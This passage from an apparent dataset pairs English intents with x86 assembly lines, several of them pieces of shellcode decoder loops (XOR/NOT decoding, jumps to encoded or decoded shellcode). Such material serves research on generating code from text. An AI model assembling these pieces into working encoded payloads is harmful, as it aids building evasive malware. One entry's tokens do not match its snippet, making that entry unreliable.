    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to inc_dec",
    "rewritten_intent": "jump short to inc_dec",
    "snippet": "jmp short inc_dec",
    "slot_map": {
      "inc_dec": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to main",
    "rewritten_intent": "jump short to main",
    "snippet": "jmp short main",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "main"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "main"
    ]
  },
  {
    "intent": "go to shellcode_section",
    "rewritten_intent": "go to shellcode_section",
    "snippet": "jmp short shellcode_section",
    "slot_map": {
      "shellcode_section": "var0"
    },
    "intent_tokens": [
      "go",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to switch",
    "rewritten_intent": "jump short to switch",
    "snippet": "jmp short switch",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "switch"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "switch"
    ]
  },
  {
    "intent": "if zero jump to decoded_shellcode",
    "rewritten_intent": "if zero jump to decoded_shellcode",
    "snippet": "jz decoded_shellcode",
    "slot_map": {
      "decoded_shellcode": "var0"
    },
    "intent_tokens": [
      "if",
      "zero",
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "jz",
      "var0"
    ]
  },
  {
    "intent": "load the address of edi+2 into edi",
    "rewritten_intent": "load the address of edi+2 into edi",
    "snippet": "lea edi, [edi + 2]",
    "slot_map": {
      "edi+2": "var0"
    },
    "intent_tokens": [
      "load",
      "address",
      "var0",
      "edi"
    ],
    "snippet_tokens": [
      "lea",
      "edi",
      ",",
      "[",
      "edi",
      "+",
      "2",
      "]"
    ]
  },
  {
    "intent": "load the address at esi + 13 into edi",
    "rewritten_intent": "load the address at esi + 13 into edi",
    "snippet": "lea edi, [esi + 13]",
    "slot_map": {
      "esi + 13": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "load",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the address of esi into edi",
    "rewritten_intent": "load the address of esi into edi",
    "snippet": "lea edi, [esi]",
    "slot_map": {
      "esi": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "load",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "point edi to the start of the shellcode",
    "rewritten_intent": "point edi to the start of the shellcode",
    "snippet": "lea edi, [esi]",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "start",
      "shellcode"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "load the contents of esi into edi",
    "rewritten_intent": "load the contents of esi into edi",
    "snippet": "lea edi, [esi]",
    "slot_map": {
      "esi": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "load",
      "contents",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the address of esi+0x1 into edi",
    "rewritten_intent": "load the address of esi+0x1 into edi",
    "snippet": "lea edi, [esi+0x1]",
    "slot_map": {
      "esi+0x1": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "load",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of esi+2 into esi",
    "rewritten_intent": "load the effective address of esi+2 into esi",
    "snippet": "lea esi, [esi+2]",
    "slot_map": {
      "esi+2": "var0"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "var0",
      "esi"
    ],
    "snippet_tokens": [
      "lea",
      "esi",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "decrease the counter and jump to check_even_odd if not zero else jump short to shellcode",
    "rewritten_intent": "decrease the counter and jump to check_even_odd if not zero else jump short to shellcode",
    "snippet": "loop check_even_odd \\n jmp short shellcode",
    "slot_map": {
      "check_even_odd": "var0"
    },
    "intent_tokens": [
      "decrease",
      "counter",
      "and",
      "jump",
      "var0",
      "if",
      "not",
      "zero",
      "else",
      "jump",
      "short",
      "shellcode"
    ],
    "snippet_tokens": [
      "loop",
      "var0",
      "\\n",
      "jmp",
      "short",
      "shellcode"
    ]
  },
  {
    "intent": "decrease the counter and jump to decode if not zero",
    "rewritten_intent": "decrease the counter and jump to decode if not zero",
    "snippet": "loop decode",
    "slot_map": {},
    "intent_tokens": [
      "decrease",
      "counter",
      "and",
      "jump",
      "decode",
      "if",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "decode"
    ]
  },
  {
    "intent": "decrement the counter and jump to decode if not zero else jump to edx",
    "rewritten_intent": "decrement the counter and jump to decode if not zero else jump to edx",
    "snippet": "loop decode \\n jmp edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "jump",
      "decode",
      "if",
      "not",
      "zero",
      "else",
      "jump",
      "var0"
    ],
    "snippet_tokens": [
      "loop",
      "decode",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the encodedshellcode label",
    "rewritten_intent": "decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the encodedshellcode label",
    "snippet": "loop decode \\n jmp encodedshellcode",
    "slot_map": {
      "ecx": "var0",
      "encodedshellcode": "var2"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "decode",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "jump",
      "short",
      "var2",
      "label"
    ],
    "snippet_tokens": [
      "loop",
      "decode",
      "\\n",
      "jmp",
      "var2"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label",
    "rewritten_intent": "decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label",
    "snippet": "loop decode \\n jmp shellcode",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "decode",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "jump",
      "short",
      "shellcode",
      "label"
    ],
    "snippet_tokens": [
      "loop",
      "decode",
      "\\n",
      "jmp",
      "shellcode"
    ]
  },
  {
    "intent": "decrement the counter and jump to decode routine if it is not zero else jump to shellcode label",
    "rewritten_intent": "decrement the counter and jump to decode routine if it is not zero else jump to shellcode label",
    "snippet": "loop decode \\n jmp shellcode",
    "slot_map": {
      "decode": "var0"
    },
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "jump",
      "var0",
      "routine",
      "if",
      "it",
      "not",
      "zero",
      "else",
      "jump",
      "shellcode",
      "label"
    ],
    "snippet_tokens": [
      "loop",
      "var0",
      "\\n",
      "jmp",
      "shellcode"
    ]
  },
  {
    "intent": "decrement the counter and jump to the decode label if it is not zero else jump short to the encodedshellcode label",
    "rewritten_intent": "decrement the counter and jump to the decode label if it is not zero else jump short to the encodedshellcode label",
    "snippet": "loop decode \\n jmp short encodedshellcode",
    "slot_map": {
      "encodedshellcode": "var0"
    },
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "jump",
      "decode",
      "label",
      "if",
      "it",
      "not",
      "zero",
      "else",
      "jump",
      "short",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "loop",
      "decode",
      "\\n",
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "decrease the counter and jump to decode if not zero else jump short to shellcode",
    "rewritten_intent": "decrease the counter and jump to decode if not zero else jump short to shellcode",
    "snippet": "loop decode \\n jmp short shellcode",
    "slot_map": {},
    "intent_tokens": [
      "decrease",
      "counter",
      "and",
      "jump",
      "decode",
      "if",
      "not",
      "zero",
      "else",
      "jump",
      "short",
      "shellcode"
    ],
    "snippet_tokens": [
      "loop",
      "decode",
      "\\n",
      "jmp",
      "short",
      "shellcode"
    ]
  },
  {
    "intent": "decrement the counter and if it is not zero go back at decode_loop and execute the cicle again else jump to encoded_shellcode",
    "rewritten_intent": "decrement the counter and if it is not zero go back at decode_loop and execute the cicle again else jump to encoded_shellcode",
    "snippet": "loop decode_loop \\n jmp short encoded_shellcode",
    "slot_map": {
      "decode_loop": "var0",
      "encoded_shellcode": "var2",
      "cicle": "var1"
    },
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "if",
      "it",
      "not",
      "zero",
      "go",
      "back",
      "var0",
      "and",
      "execute",
      "var1",
      "again",
      "else",
      "jump",
      "var2"
    ],
    "snippet_tokens": [
      "loop",
      "var0",
      "\\n",
      "jmp",
      "short",
      "var2"
    ]
  },
  {
    "intent": "lowbound label",
    "rewritten_intent": "lowbound label",
    "snippet": "lowbound:",
    "slot_map": {
      "lowbound": "var0"
    },
    "intent_tokens": [
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "main function",
    "rewritten_intent": "main function",
    "snippet": "main:",
    "slot_map": {
      "main": "var0"
    },
    "intent_tokens": [
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "move al into the address pointed by edi",
    "rewritten_intent": "move al into the address pointed by edi",
    "snippet": "mov [edi], al",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "al",
      "address",
      "pointed",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move the contents of the al register into the address pointed by edi",
    "rewritten_intent": "move the contents of the al register into the address pointed by edi",
    "snippet": "mov [edi], al",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "al",
      "register",
      "address",
      "pointed",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "swap al value with next byte value in esi",
    "rewritten_intent": "swap al value with next byte value in esi",
    "snippet": "mov [esi], al",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "swap",
      "al",
      "value",
      "next",
      "byte",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "move the byte in esi into al",
    "rewritten_intent": "move the byte in esi into al",
    "snippet": "mov al, byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the byte pointed by esi in al",
    "rewritten_intent": "load the byte pointed by esi in al",
    "snippet": "mov al, byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "load",
      "byte",
      "pointed",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "put the byte at the address esi+1+ebp into al",
    "rewritten_intent": "put the byte at the address esi+1+ebp into al",
    "snippet": "mov al, byte [esi+1+ebp]",
    "slot_map": {
      "esi+1+ebp": "var0"
    },
    "intent_tokens": [
      "put",
      "byte",
      "address",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "backup cl into al",
    "rewritten_intent": "backup cl into al",
    "snippet": "mov al, cl",
    "slot_map": {},
    "intent_tokens": [
      "backup",
      "cl",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move dl to al",
    "rewritten_intent": "move dl to al",
    "snippet": "mov al, dl",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "dl",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "dl"
    ]
  },
  {
    "intent": "copy the contents of dl into al",
    "rewritten_intent": "copy the contents of dl into al",
    "snippet": "mov al, dl",
    "slot_map": {},
    "intent_tokens": [
      "copy",
      "contents",
      "dl",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "al",
      ",",
      "dl"
    ]
  },
  {
    "intent": "move the contents at the address stored in esi into the ax register",
    "rewritten_intent": "move the contents at the address stored in esi into the ax register",
    "snippet": "mov ax, [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "address",
      "stored",
      "var0",
      "ax",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "ax",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "mov the word at the address edi+1+ecx into ax",
    "rewritten_intent": "mov the word at the address edi+1+ecx into ax",
    "snippet": "mov ax, word [edi + 1 + ecx]",
    "slot_map": {
      "edi+1+ecx": "var1",
      "mov": "var0"
    },
    "intent_tokens": [
      "var0",
      "word",
      "address",
      "var1",
      "ax"
    ],
    "snippet_tokens": [
      "var0",
      "ax",
      ",",
      "word",
      "[",
      "edi",
      "+",
      "1",
      "+",
      "ecx",
      "]"
    ]
  },
  {
    "intent": "move the contents of bl into bh",
    "rewritten_intent": "move the contents of bl into bh",
    "snippet": "mov bh, bl",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "bh"
    ],
    "snippet_tokens": [
      "mov",
      "bh",
      ",",
      "var0"
    ]
  },
  {
    "intent": "save the byte in esi+edx+2 in bh",
    "rewritten_intent": "save the byte in esi+edx+2 in bh",
    "snippet": "mov bh, byte [esi + edx + 2]",
    "slot_map": {
      "esi+edx+2": "var0"
    },
    "intent_tokens": [
      "save",
      "byte",
      "var0",
      "bh"
    ],
    "snippet_tokens": [
      "mov",
      "bh",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edx",
      "+",
      "2",
      "]"
    ]
  },
  {
    "intent": "move the current byte of the shellcode to the bl",
    "rewritten_intent": "move the current byte of the shellcode to the bl",
    "snippet": "mov bl, [esi]",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "current",
      "byte",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "move 0x7 to bl",
    "rewritten_intent": "move 0x7 to bl",
    "snippet": "mov bl, 0x7",
    "slot_map": {
      "0x7": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0xff into bl",
    "rewritten_intent": "move the value 0xff into bl",
    "snippet": "mov bl, 0xff",
    "slot_map": {
      "0xff": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the byte in eax to bl",
    "rewritten_intent": "move the byte in eax to bl",
    "snippet": "mov bl, byte [eax]",
    "slot_map": {
      "eax": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address edi+ecx into bl",
    "rewritten_intent": "move the byte at the address edi+ecx into bl",
    "snippet": "mov bl, byte [edi + ecx]",
    "slot_map": {
      "edi+ecx": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "edi",
      "+",
      "ecx",
      "]"
    ]
  },
  {
    "intent": "get the byte from edi and save it in bl",
    "rewritten_intent": "get the byte from edi and save it in bl",
    "snippet": "mov bl, byte [edi]",
    "slot_map": {
      "edi": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "get",
      "byte",
      "var0",
      "and",
      "save",
      "it",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address esi + eax +1 into bl",
    "rewritten_intent": "move the byte at the address esi + eax +1 into bl",
    "snippet": "mov bl, byte [esi + eax + 1]",
    "slot_map": {
      "esi + eax +1": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "eax",
      "+",
      "1",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address esi + eax into bl",
    "rewritten_intent": "move the byte at the address esi + eax into bl",
    "snippet": "mov bl, byte [esi + eax]",
    "slot_map": {
      "esi + eax": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address esi+edi into bl",
    "rewritten_intent": "move the byte at the address esi+edi into bl",
    "snippet": "mov bl, byte [esi + edi]",
    "slot_map": {
      "esi+edi": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edi",
      "]"
    ]
  },
  {
    "intent": "save the byte in esi+edx+1 in bl",
    "rewritten_intent": "save the byte in esi+edx+1 in bl",
    "snippet": "mov bl, byte [esi + edx + 1]",
    "slot_map": {
      "esi+edx+1": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "save",
      "byte",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edx",
      "+",
      "1",
      "]"
    ]
  },
  {
    "intent": "get the byte from esi and save it in bl",
    "rewritten_intent": "get the byte from esi and save it in bl",
    "snippet": "mov bl, byte [esi]",
    "slot_map": {
      "esi": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "get",
      "byte",
      "var0",
      "and",
      "save",
      "it",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address esi+eax*1 into bl",
    "rewritten_intent": "move the byte at the address esi+eax*1 into bl",
    "snippet": "mov bl, byte [esi+eax*1]",
    "slot_map": {
      "esi+eax*1": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address esi+eax*1+0x1 into bl and move bl into the byte in edi",
    "rewritten_intent": "move the byte at the address esi+eax*1+0x1 into bl and move bl into the byte in edi",
    "snippet": "mov bl, byte [esi+eax*1+0x1] \\n mov byte [edi], bl",
    "slot_map": {
      "esi+eax*1+0x1": "var0",
      "bl": "var1",
      "edi": "var3"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "var1",
      "and",
      "move",
      "var1",
      "byte",
      "var3"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]",
      "\\n",
      "mov",
      "byte",
      "[",
      "var3",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "move the byte at the address in [esi+ecx+1] in bl and subtract 0x7 from bl",
    "rewritten_intent": "move the byte at the address in [esi+ecx+1] in bl and subtract 0x7 from bl",
    "snippet": "mov bl, byte [esi+ecx+1] \\n sub bl, 0x7",
    "slot_map": {
      "esi+ecx+1": "var1",
      "0x7": "var5",
      "[": "var0",
      "]": "var2",
      "bl": "var3"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "[",
      "var1",
      "]",
      "var3",
      "and",
      "subtract",
      "var5",
      "var3"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]",
      "\\n",
      "mov",
      "byte",
      "[",
      "var3",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "backup the contents of cl into bl",
    "rewritten_intent": "backup the contents of cl into bl",
    "snippet": "mov bl, cl",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "backup",
      "contents",
      "cl",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move the contents of the address stored in esi into the bx register",
    "rewritten_intent": "move the contents of the address stored in esi into the bx register",
    "snippet": "mov bx, [esi]",
    "slot_map": {
      "esi": "var0",
      "bx": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "address",
      "stored",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move dl to the byte pointed by the contents of eax",
    "rewritten_intent": "move dl to the byte pointed by the contents of eax",
    "snippet": "mov byte [eax], dl",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "dl",
      "byte",
      "pointed",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "dl"
    ]
  },
  {
    "intent": "put the value of bl to the position of edi",
    "rewritten_intent": "put the value of bl to the position of edi",
    "snippet": "mov byte [edi], bl",
    "slot_map": {
      "bl": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "put",
      "value",
      "var0",
      "position",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move bl into the byte in edi and negate the result",
    "rewritten_intent": "move bl into the byte in edi and negate the result",
    "snippet": "mov byte [edi], bl \\n not byte [edi]",
    "slot_map": {
      "bl": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "var1",
      "and",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0",
      "\\n",
      "not",
      "byte",
      "[",
      "var1",
      "]"
    ]
  },
  {
    "intent": "move bl into the byte in edi and perform xor operation with 0xdd",
    "rewritten_intent": "move bl into the byte in edi and perform xor operation with 0xdd",
    "snippet": "mov byte [edi], bl \\n xor byte [edi], 0xdd",
    "slot_map": {
      "0xdd": "var2",
      "bl": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "var1",
      "and",
      "perform",
      "xor",
      "operation",
      "var2"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0",
      "\\n",
      "xor",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var2"
    ]
  },
  {
    "intent": "move bl into the byte at the address edx + eax",
    "rewritten_intent": "move bl into the byte at the address edx + eax",
    "snippet": "mov byte [edx + eax], bl",
    "slot_map": {
      "edx + eax": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "address",
      "edx",
      "+",
      "eax"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move dl into the byte in esi+1",
    "rewritten_intent": "move dl into the byte in esi+1",
    "snippet": "mov byte [esi + 1], dl",
    "slot_map": {
      "esi+1": "var0"
    },
    "intent_tokens": [
      "move",
      "dl",
      "byte",
      "esi+1"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esi",
      "+",
      "1",
      "]",
      ",",
      "dl"
    ]
  },
  {
    "intent": "move bl into the byte defined by the address esi + eax",
    "rewritten_intent": "move bl into the byte defined by the address esi + eax",
    "snippet": "mov byte [esi + eax], bl",
    "slot_map": {
      "esi + eax": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "defined",
      "address",
      "esi",
      "+",
      "eax"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move dl into the byte in esi",
    "rewritten_intent": "move dl into the byte in esi",
    "snippet": "mov byte [esi], dl",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "dl",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "dl"
    ]
  },
  {
    "intent": "move bl into the byte in esi+ecx",
    "rewritten_intent": "move bl into the byte in esi+ecx",
    "snippet": "mov byte [esi+ecx], bl",
    "slot_map": {
      "esi+ecx": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "esi+ecx"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move cl into the byte in esp+eax+1",
    "rewritten_intent": "move cl into the byte in esp+eax+1",
    "snippet": "mov byte [esp + eax + 1], cl",
    "slot_map": {
      "esp+eax+1": "var0"
    },
    "intent_tokens": [
      "move",
      "cl",
      "byte",
      "esp+eax+1"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "+",
      "eax",
      "+",
      "1",
      "]",
      ",",
      "cl"
    ]
  },
  {
    "intent": "move bh into the byte in esp+eax+2",
    "rewritten_intent": "move bh into the byte in esp+eax+2",
    "snippet": "mov byte [esp + eax + 2], bh",
    "slot_map": {
      "esp+eax+2": "var0"
    },
    "intent_tokens": [
      "move",
      "bh",
      "byte",
      "esp+eax+2"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "+",
      "eax",
      "+",
      "2",
      "]",
      ",",
      "bh"
    ]
  },
  {
    "intent": "move bl into the byte in esp+eax+3",
    "rewritten_intent": "move bl into the byte in esp+eax+3",
    "snippet": "mov byte [esp + eax + 3], bl",
    "slot_map": {
      "esp+eax+3": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "esp+eax+3"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "+",
      "eax",
      "+",
      "3",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move ch into the byte in esp+eax",
    "rewritten_intent": "move ch into the byte in esp+eax",
    "snippet": "mov byte [esp + eax], ch",
    "slot_map": {
      "esp+eax": "var1",
      "ch": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "esp+eax"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "esp",
      "+",
      "eax",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move bl into the byte in edx + eax",
    "rewritten_intent": "move bl into the byte in edx + eax",
    "snippet": "mov byte [edx + eax], bl",
    "slot_map": {
      "edx + eax": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "edx",
      "+",
      "eax"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "save the byte in esi+edx+4 in ch",
    "rewritten_intent": "save the byte in esi+edx+4 in ch",
    "snippet": "mov ch, byte [esi + edx + 4]",
    "slot_map": {
      "esi+edx+4": "var0",
      "ch": "var1"
    },
    "intent_tokens": [
      "save",
      "byte",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edx",
      "+",
      "4",
      "]"
    ]
  },
  {
    "intent": "move 10 into the first byte of the counter",
    "rewritten_intent": "move 10 into the first byte of the counter",
    "snippet": "mov cl, 10",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "10",
      "first",
      "byte",
      "counter"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "10"
    ]
  },
  {
    "intent": "move 13 to cl",
    "rewritten_intent": "move 13 to cl",
    "snippet": "mov cl, 13",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "13",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "13"
    ]
  },
  {
    "intent": "put the contents of the al into the cl register",
    "rewritten_intent": "put the contents of the al into the cl register",
    "snippet": "mov cl, al",
    "slot_map": {},
    "intent_tokens": [
      "put",
      "contents",
      "al",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "al"
    ]
  },
  {
    "intent": "move the byte in eax to cl",
    "rewritten_intent": "move the byte in eax to cl",
    "snippet": "mov cl, byte [eax]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "save the byte in esi+edx+3 in cl",
    "rewritten_intent": "save the byte in esi+edx+3 in cl",
